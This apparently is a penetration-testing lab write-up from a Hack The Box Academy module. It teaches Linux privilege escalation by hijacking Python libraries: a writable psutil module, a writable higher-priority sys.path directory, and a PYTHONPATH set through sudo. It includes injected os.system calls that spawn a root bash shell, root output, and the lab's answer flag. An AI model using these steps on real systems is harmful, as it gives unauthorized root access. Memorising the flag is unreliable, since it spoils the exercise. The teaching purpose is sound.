# Python Library Hijacking

there are three basic vulnerabilities where hijacking can be used:

1. Wrong write permissions
2. Library Path
3. PYTHONPATH environment variabale

### Wrong Write Permissions

One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. **If `SUID`/`SGID` permissions have been assigned to the Python script that imports this module, our code will automatically be included.**

If we look at the set permissions of the `mem_stats.py` script, we can see that it has a `SUID` set.

**Python Script**

```shell-session
htb-student@lpenix:~$ ls -l mem_stats.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_stats.py
```

So we can execute this script with the privileges of another user, in our case, as `root`. We also have permission to view the script and read its contents.

**Python Script - Contents**

Code: python

{% code lineNumbers="true" %}
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```
{% endcode %}

This script shows the available virtual memory in percent. We can also see in the second line that this script imports the module `psutil` and uses the function `virtual_memory()`.

So we can look for this function in the folder of `psutil` and check if this module has write permissions for us.

**Module Permissions**

```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Such permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.

**Module Contents**

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

It is recommended to put our code right at the beginning of the function. We can import the module `os` for testing purposes, which allows us to execute system commands. With this, we can insert the command `id` and check during the execution of the script if the inserted code is executed.

**Module Contents - Hijacking**

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Now we can run the script with `sudo` and check if we get the desired result.

**Privilege Escalation**

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

### Library Path

The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.

**PYTHONPATH Listing**

```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions.

Python accesses the first hit it finds and imports it before reaching the original and intended module.

**Psutil Default Installation Location**

```shell-session
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

* `psutil` is installed in the following path: `/usr/local/lib/python3.8/dist-packages`.



**Misconfigured Directory Permissions**

```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it.

Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in

**Hijacked Module Contents - psutil.py**

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack.

run the `mem_status.py` script using `sudo` like in the previous example.

**Privilege Escalation via Hijacking Python Library Path**

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_stats.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_stats.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

### PYTHONPATH Environment Variable

`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import.

We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

```shell-session
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

we are allowed to run `/usr/bin/python3` and are allowed to set environment variables for use with this binary by the `SETENV:` flag being set.

**Privilege Escalation using PYTHONPATH Environment Variable**

```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

## Assessment

Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer.

```bash
htb-student@ubuntu:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
htb-student@ubuntu:~$ vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
htb-student@ubuntu:~$ sudo /usr/bin/python3 /home/htb-student/mem_status.py

root@ubuntu:/home/htb-student# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/htb-student# 
```

added the following code after the function was defined

```
os.system("/bin/bash")
```

```
root@ubuntu:~# cat flag.txt 
HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
```

